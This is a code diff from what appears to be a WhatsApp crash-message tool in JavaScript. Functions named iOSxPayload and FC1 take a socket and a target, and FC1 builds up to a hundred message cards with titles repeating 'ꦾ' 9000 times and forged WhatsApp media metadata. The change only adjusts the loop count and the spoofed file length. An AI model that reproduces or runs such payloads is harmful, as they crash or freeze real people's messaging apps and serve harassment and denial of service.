@@ -965,7 +965,7 @@ async function iOSxPayload(sock, target) {
 async function FC1(sock, target) {
   const cards = [];
   
-  for (let i = 0; i < 999; i++) { 
+  for (let i = 0; i < 100; i++) { 
     cards.push({
       header: {
         title: 'ꦾ'.repeat(9000),
@@ -973,7 +973,7 @@ async function FC1(sock, target) {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
           mimetype: "image/jpeg",
           fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
-          fileLength: Math.floor(99.99 * 1073741824).toString(),
+          fileLength: Math.floor(10 * 490).toString(),
           height: 1,
           width: 1,
           mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
